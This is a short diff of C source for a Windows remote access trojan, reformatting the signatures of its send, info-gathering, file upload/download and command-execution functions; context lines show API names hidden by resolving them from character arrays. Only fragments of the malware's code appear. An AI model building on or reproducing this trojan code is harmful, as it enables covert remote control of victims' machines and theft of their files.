@@ -22,7 +22,9 @@ struct RATSocket
 	_WSAGetLastError *f_WSAGetLastError;	
 };
 
-int SocketSend(RATSocket* ratSocket, char* messageBuffer, unsigned int bufferSize)
+int
+SocketSend(RATSocket* ratSocket, char*
+		   messageBuffer, unsigned int bufferSize)
 {
 	char ca_send[] = { 's','e','n','d', 0};
 	_send* f_send = (_send*)GetProcAddress(ratSocket->libraryWinsock2, ca_send);
@@ -36,7 +38,8 @@ int SocketSend(RATSocket* ratSocket, char* messageBuffer, unsigned int bufferSiz
 	return 0;
 }
 
-int FetchInfo(RATSocket* ratSocket)
+int
+FetchInfo(RATSocket* ratSocket)
 {
 	char bufferError[SOCKET_BUFFER_SIZE];
 	char bufferUser[UNLEN + 1];
@@ -83,7 +86,9 @@ int FetchInfo(RATSocket* ratSocket)
 	return 0;
 }
 
-int DownloadFile(RATSocket* ratSocket, char* splittedCommand[SPLIT_STRING_ARRAY_SIZE])
+int
+DownloadFile(RATSocket* ratSocket,
+			 char* splittedCommand[SPLIT_STRING_ARRAY_SIZE])
 {
 	char* totalReceivedData = NULL;
 	int totalBytesRead = 0;
@@ -147,7 +152,9 @@ int DownloadFile(RATSocket* ratSocket, char* splittedCommand[SPLIT_STRING_ARRAY_
 	return 0;
 }
 
-int UploadFile(RATSocket* ratSocket, char* filePath)
+int
+UploadFile(RATSocket* ratSocket,
+		   char* filePath)
 {
 	FILE* fs;
 	errno_t errorNo = fopen_s(&fs, filePath, "rb");
@@ -180,7 +187,9 @@ int UploadFile(RATSocket* ratSocket, char* filePath)
 	}
 }
 
-int ReceiveCmdCommand(RATSocket* ratSocket, char* splittedCommand[SPLIT_STRING_ARRAY_SIZE])
+int
+ReceiveCmdCommand(RATSocket* ratSocket,
+				  char* splittedCommand[SPLIT_STRING_ARRAY_SIZE])
 {
 	PROCESS_INFORMATION pi;
 	STARTUPINFO si = { };
